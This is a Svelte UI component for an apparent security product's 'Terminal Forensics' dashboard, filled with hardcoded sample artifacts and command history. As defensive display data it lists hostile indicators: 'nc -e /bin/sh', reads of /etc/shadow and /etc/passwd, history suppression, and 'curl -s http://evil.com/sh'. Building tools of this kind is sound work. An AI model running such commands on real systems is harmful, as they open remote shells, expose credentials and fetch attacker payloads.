<!--
  OBLIVRA — Terminal Forensics (Svelte 5)
  Deep inspection of terminal streams and command lineage.
-->
<script lang="ts">
  import { KPI, PageLayout, Button, Badge, DataTable } from '@components/ui';
  import { Shield, Search, FileText, Database, Activity } from 'lucide-svelte';

  const artifacts = [
    { id: 'A-11', type: 'Env Var', name: 'HISTFILE', value: '/dev/null', risk: 'high' },
    { id: 'A-12', type: 'File op', name: '/etc/shadow', value: 'Read attempt', risk: 'critical' },
    { id: 'A-13', type: 'Pipe', name: 'nc -e /bin/sh', value: 'Outbound stream', risk: 'critical' },
  ];
</script>

<PageLayout title="Terminal Forensics" subtitle="Deep inspection of command lineage and artifact leakage">
  {#snippet toolbar()}
    <div class="flex items-center gap-2">
      <Button variant="secondary" size="sm">Export Timeline</Button>
      <Button variant="cta" size="sm">Audit Lock</Button>
    </div>
  {/snippet}

  <div class="flex flex-col h-full gap-6">
    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
      <KPI title="Command Entropy" value="High" trend="Anomalous" variant="error" />
      <KPI title="Detected Shells" value="3" trend="Isolated" variant="warning" />
      <KPI title="Data Leakage" value="None" trend="Optimal" variant="success" />
      <KPI title="Integrity Score" value="98%" trend="Verified" />
    </div>

    <div class="flex-1 min-h-0 grid grid-cols-1 lg:grid-cols-3 gap-6">
      <!-- Artifacts Table -->
      <div class="lg:col-span-2 bg-surface-1 border border-border-primary rounded-md overflow-hidden flex flex-col">
        <div class="p-3 bg-surface-2 border-b border-border-primary text-[10px] font-bold uppercase tracking-widest text-text-muted">Extracted Forensic Artifacts</div>
        <div class="flex-1 overflow-auto">
          <DataTable data={artifacts} columns={[
            { key: 'type', label: 'Artifact Type', width: '120px' },
            { key: 'name', label: 'Indicator' },
            { key: 'value', label: 'Context' },
            { key: 'risk', label: 'Priority', width: '100px' }
          ]} density="compact">
            {#snippet cell({ column, row })}
              {#if column.key === 'risk'}
                <Badge variant={row.risk === 'critical' ? 'error' : row.risk === 'high' ? 'warning' : 'info'}>
                  {row.risk}
                </Badge>
              {:else if column.key === 'type'}
                <span class="text-[9px] font-bold text-text-muted uppercase">{row.type}</span>
              {:else}
                <span class="text-[11px] text-text-secondary">{row[column.key]}</span>
              {/if}
            {/snippet}
          </DataTable>
        </div>
      </div>

      <!-- Command History Lineage -->
      <div class="bg-surface-1 border border-border-primary rounded-md p-4 flex flex-col gap-4">
        <div class="text-[10px] font-bold text-text-muted uppercase tracking-widest border-b border-border-primary pb-2">Command Lineage</div>
        <div class="flex-1 space-y-4 overflow-y-auto">
          {#each Array(5) as _, i}
            <div class="flex items-start gap-3 relative">
              {#if i < 4}
                <div class="absolute left-1.5 top-4 bottom-0 w-px bg-border-secondary"></div>
              {/if}
              <div class="w-3 h-3 rounded-full bg-accent shrink-0 mt-1 z-10 border-2 border-surface-1"></div>
              <div class="flex flex-col gap-1">
                <span class="text-[10px] text-text-muted font-mono">08:14:{12 + i * 2}</span>
                <code class="text-[11px] font-bold text-text-heading bg-black/20 p-1 rounded-sm border border-white/5">
                  {i === 0 ? 'ps aux | grep root' : i === 1 ? 'cat /etc/passwd' : 'curl -s http://evil.com/sh'}
                </code>
              </div>
            </div>
          {/each}
        </div>
      </div>
    </div>
  </div>
</PageLayout>
